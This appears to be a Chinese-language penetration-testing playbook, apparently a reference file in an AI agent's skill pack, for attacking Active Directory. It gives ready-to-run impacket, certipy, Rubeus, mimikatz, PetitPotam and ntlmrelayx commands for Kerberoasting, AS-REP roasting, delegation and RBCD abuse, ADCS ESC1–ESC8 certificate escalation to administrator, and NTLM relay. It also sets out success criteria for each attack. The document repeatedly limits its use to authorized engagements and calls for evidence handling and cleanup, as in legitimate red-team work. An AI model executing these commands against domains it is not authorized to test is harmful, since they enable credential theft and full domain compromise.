# Kerberos 与 ADCS（kerberos-and-adcs）

> 配套 `ad-cloud/SKILL.md`、`references/ad-attacks.md`。所有命令只在**明确授权**的域/账号/主机上执行。
> 占位符：`<domain>`、`<DC_IP>`、`<user>`、`<pass>`、`<target>`、`<CA>`、`<Tpl>`。先同步时间（±5 分钟），并确认账号锁定阈值。

## 0. 前置与降噪

```bash
export DOMAIN='corp.local'
export DC='10.0.0.10'
export USER='alice'
export PASS='P@ssw0rd'
sudo chronyc makestep 2>/dev/null || sudo ntpdate -u "$DC"
nxc smb "$DC" --pass-pol -u '' -p ''        # 先看锁定阈值/密码策略
```

- 同一账号认证失败 2 次立即停；不要用锁定阈值做“试试看”。
- Kerberoast/AS-REP 请求会进 4769/4768；控制频率，优先单账号/单 SPN。
- 票据/证书是敏感证据：报告只留指纹、有效期、用途，不回传明文。

## 1. Kerberoasting（TGS）

```bash
# 枚举可 Kerberoast 的账号（不请求票据）
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
# 请求指定 SPN 的 TGS（降噪）
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC" \
  -request-user '<svc>' -outputfile evidence/kerb/kerb.hashes
# 需要全部可 roast 账号时才用 -request
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC" \
  -request -outputfile evidence/kerb/kerb-all.hashes
```

破解模式：

```bash
hashcat -m 13100 evidence/kerb/kerb.hashes wordlist.txt   # RC4 TGS-REP
hashcat -m 19700 evidence/kerb/kerb.hashes wordlist.txt   # AES128 TGS-REP
hashcat -m 19800 evidence/kerb/kerb.hashes wordlist.txt   # AES256 TGS-REP
```

判据：

- 拿到可离线破解的 TGS，且破解出明文，或用该 hash 直接完成下一步（PtH/票据伪造需匹配 etype）。
- 仅有 TGS/hash、未破解 = **素材**，不能写成“拿到域账号”。
- 账号仅支持 AES 时，强行请求 RC4 可能失败或触发策略；先看 `msDS-SupportedEncryptionTypes`。

失败判据：`KRB_AP_ERR_SKEW`（时钟）、`STATUS_ACCOUNT_LOCKED_OUT`（停）、无 SPN、仅 AES 且字典不匹配。

## 2. AS-REP Roasting（无预认证）

```bash
# 批量：先确认 DONT_REQ_PREAUTH，避免无谓请求
impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC" -usersfile users.txt \
  -format hashcat -outputfile evidence/kerb/asrep.hashes
# 单账号
impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC" -request-user '<user>' \
  -no-pass -format hashcat -outputfile evidence/kerb/asrep-one.hash
```

```bash
hashcat -m 18200 evidence/kerb/asrep.hashes wordlist.txt   # RC4 AS-REP
hashcat -m 19900 evidence/kerb/asrep.hashes wordlist.txt   # AES256 AS-REP
```

判据：hash 破解出明文，或可直接用于 Kerberos 预认证/离线复用。
失败判据：账号启用了预认证、账号被锁定、或只有 AES 而字典不匹配。

## 3. 委派（Unconstrained / Constrained / RBCD）

### 3.1 枚举

```bash
impacket-findDelegation "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
# Windows/PowerView
Get-DomainComputer -Unconstrained -Properties dnshostname,samaccountname
Get-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto
Get-DomainComputer -Properties samaccountname,msds-allowedtoactonbehalfofotheridentity
```

### 3.2 Unconstrained（无约束委派）

前提：能控制一台被配置为 Unconstrained 的主机，并让高权账号/主机认证到它。

```bash
# Windows 受控主机
Rubeus.exe monitor /interval:5 /nowrap
# 或从内存导出票据
sekurlsa::tickets /export
```

判据：捕获到高价值账号的 TGT，并能用 `Rubeus ptt`/`impacket` 导入后访问目标服务。
失败判据：只看到机器账号 TGT、目标未发起认证、或票据已过期。

### 3.3 Constrained（约束委派，S4U2Self + S4U2Proxy）

```bash
impacket-getST -spn 'cifs/<target>' -impersonate administrator \
  "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass "$DOMAIN/administrator@<target>"
```

判据：以目标身份拿到服务票据，`whoami` 返回预期账号。
失败判据：SPN 不匹配、`msDS-AllowedToDelegateTo` 未包含目标、目标服务拒绝协议转换。

### 3.4 RBCD（基于资源的约束委派）

前提：对目标计算机对象有写 `msDS-AllowedToActOnBehalfOfOtherIdentity` 的权限。

```bash
impacket-addcomputer "$DOMAIN/$USER:$PASS" -dc-ip "$DC" \
  -computer-name 'EVIL$' -computer-pass 'P@ss1234'
impacket-rbcd -action write -delegate-to '<target>$' -delegate-from 'EVIL$' \
  "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
impacket-getST -spn 'cifs/<target>' -impersonate administrator \
  "$DOMAIN/EVIL$:P@ss1234" -dc-ip "$DC"
```

判据：S4U2Proxy 成功并拿到目标服务票据；随后能远程执行。
失败判据：无写权限、目标已设置 RBCD 冲突、或目标禁用协议转换。

## 4. ADCS 枚举

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -vulnerable -stdout
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -json -output evidence/adcs/find
```

先记录：CA 名称/主机、模板名、`Enroll` 权限、`Client Authentication`/`Any Purpose` EKU、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`、`manager approval`、`Authorized Signatures`、CA 的 `EDITF_ATTRIBUTESUBJECTALTNAME2`、HTTP 注册端点。

`certipy find` 报 vulnerable **不等于**可利用；必须确认当前账号能注册、模板允许目标用法、没有审批。

## 5. ESC1-8：条件、命令、判据

### ESC1 — 模板允许任意 SAN + 低权可注册

条件：模板 `Enrollee Supplies Subject`、`Client Authentication` EKU、当前账号 `Enroll`、无 manager approval。

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" \
  -ca '<CA>' -template '<Tpl>' -upn "administrator@$DOMAIN"
certipy auth -pfx administrator.pfx -dc-ip "$DC"
```

判据：`certipy auth` 返回 administrator 的 TGT 或 hash，并能访问目标资源。
失败判据：CA 拒绝 SAN、模板需审批、证书缺少客户端认证 EKU、或 `auth` 报 `KDC_ERR_CLIENT_REVOKED`。

### ESC2 — Any Purpose / 无 EKU

条件：模板 EKU 为 Any Purpose 或空，低权可注册。

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -template '<Tpl>'
# 证书可用于客户端认证/注册代理等，取决于目标服务接受链
certipy auth -pfx user.pfx -dc-ip "$DC"
```

判据：证书被目标服务接受并完成认证/代签。仅拿到证书不算。

### ESC3 — 注册代理（Enrollment Agent）

条件：可注册 `Certificate Request Agent` 模板；目标模板允许代理注册。

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" \
  -ca '<CA>' -template 'ESC3-CRA'
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" \
  -ca '<CA>' -template '<Tpl>' -on-behalf-of "$DOMAIN\\administrator" \
  -pfx agent.pfx
certipy auth -pfx administrator.pfx -dc-ip "$DC"
```

判据：代理证书成功代签出目标用户证书，且 `auth` 得到目标 TGT/hash。
失败判据：代理模板未启用、目标模板限制 `Application Policy`、或 CA 拒绝。

### ESC4 — 模板 ACL 可写

条件：当前账号对模板对象有 `WriteDACL`/`WriteOwner`/`GenericAll` 等。

```bash
# 先备份原模板配置；具体恢复参数以本地 certipy 版本的 template -h 为准
certipy template -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" \
  -template '<Tpl>' -save-old
# 将模板改为默认可利用配置（常开启 SAN/EKU），随后按 ESC1 申请
certipy template -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" \
  -template '<Tpl>' -write-default-configuration
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" \
  -ca '<CA>' -template '<Tpl>' -upn "administrator@$DOMAIN"
```

判据：模板修改成功、申请到含目标 SAN 的证书、`certipy auth` 成功。
失败判据：ACL 只读、模板被 CA 策略覆盖、或修改触发审批/告警。测试后按备份恢复模板。

### ESC5 — PKI 对象 ACL 可写

条件：对 CA 对象、模板容器、`NTAuthCertificates` 等有写权限。

```bash
# 枚举 ACL（任选已安装工具）
dacledit.py -action read -target 'CN=<CA>,CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<tld>' \
  "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
# 授权范围内写 ACL（示例；先备份）
dacledit.py -action write -rights FullControl -principal "$USER" \
  -target 'CN=<CA>,CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<tld>' \
  "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
```

判据：获得对 CA/模板对象的控制后，能完成 ESC7/ESC4 的实际利用（改配置、发证）。
失败判据：只有读权限、对象受 AdminSDHolder/SACL 保护、或写入被审计回滚。

### ESC6 — CA 允许 SAN（EDITF_ATTRIBUTESUBJECTALTNAME2）

条件：CA 配置了 `EDITF_ATTRIBUTESUBJECTALTNAME2`，任意可注册模板都能塞 SAN。

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -vulnerable -stdout
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" \
  -ca '<CA>' -template 'User' -upn "administrator@$DOMAIN"
certipy auth -pfx administrator.pfx -dc-ip "$DC"
```

判据：非 ESC1 模板也签发含目标 SAN 的证书，并成功认证。
失败判据：CA 未开该 flag、模板强制审批、或证书用途不匹配。

### ESC7 — CA 管理权限（ManageCA / ManageCertificates）

条件：当前账号对 CA 有 `ManageCA` 或 `ManageCertificates`。

```bash
# 成为 CA officer / 管理证书
certipy ca -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -add-officer "$USER"
# 提交并批准待处理请求（id 从 certipy req / CA 队列获得）
certipy ca -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -issue-request <id>
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -retrieve <id>
```

判据：成功批准/检索到目标证书，并用 `certipy auth` 验证。
失败判据：只有 `ManageCA` 但无法改审批策略、请求 ID 不属于当前权限、或 CA 强制离线审批。

### ESC8 — HTTP 注册端点 + NTLM relay

条件：CA 暴露 HTTP 注册（`/certsrv/`），目标可被强制认证，且未启用 EPA/签名。

```bash
# 方式 A：certipy relay
certipy relay -ca '<CA>' -template 'DomainController'
# 方式 B：ntlmrelayx 的 ADCS 模式
impacket-ntlmrelayx -t 'http://<CA_HOST>/certsrv/certfnsh.asp' \
  -smb2support --adcs --template 'DomainController'
# 触发（需单独授权）
petitpotam.py <listener_ip> <target_ip>
```

判据：relay 成功拿到证书，`certipy auth -pfx <cert>.pfx` 得到目标 TGT/hash。
失败判据：EPA 开启、SMB/LDAP signing 强制、HTTP 端点只允许 Kerberos、或证书模板需审批。

## 6. NTLM relay 的通用前提

```bash
nxc smb <target> -u '' -p '' --gen-relay-list relay_targets.txt
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks -of evidence/relay
```

- SMB→SMB 需要目标未强制 signing；LDAP relay 需要 LDAP signing 未强制；ADCS HTTP 需要 EPA 未开。
- 先验证再投入时间；`relay_targets.txt` 只放授权目标。
- 判据：建立可用会话或拿到证书；仅收到入站认证请求不算。

## 7. 失败判据与处理

| 现象 | 原因 | 处理 |
|---|---|---|
| `KRB_AP_ERR_SKEW` | 时钟偏移 | 同步后重试一次 |
| `STATUS_ACCOUNT_LOCKED_OUT` | 触发锁定 | 立即停，换账号/来源，报告 |
| Kerberoast 无 RC4 | 账号仅 AES/策略 | 用 AES 模式或放弃该账号 |
| `certipy req` 拒绝 | 无 Enroll/需审批/无 SAN | 查模板 ACL、EKU、manager approval |
| `certipy auth` 失败 | 证书用途/CA 链/账号状态 | 查 EKU、`NTAuthCertificates`、撤销 |
| relay 无会话 | signing/EPA | 换目标或改打 ADCS HTTP |
| getST 失败 | SPN/委派属性错 | 核对 `msDS-AllowedToDelegateTo`/RBCD |

## 8. 证据与清理

- 每条路径写清：源主体 → 动作 → 目标主体 → 结果；附命令、时间、返回码。
- 凭据：类型、来源、有效期、SHA256 前 8 位；不回传明文/hash 全量。
- 提权：前后 `whoami /all`、组成员、`certipy auth` 输出、`klist`。
- 清理：删除临时计算机账号、证书请求、上传工具、计划任务；恢复被修改的模板/ACL（若有备份）。
- 报告区分“发现配置缺陷”“拿到证书”“拿到 TGT”“成功横向”，不要把前者写成后者。

## 9. 边界

- 只在授权域/账号/主机上操作；不碰授权外 DC、CA、生产业务。
- 不做未授权的持久化、后门、批量口令喷洒、拒绝服务。
- 不伪造/篡改日志；不把测试证书/票据用于授权外系统。
- 纯 Web 漏洞走 R20；云/K8s 部分见 `k8s-and-container.md` 与 `cloud-native.md`。
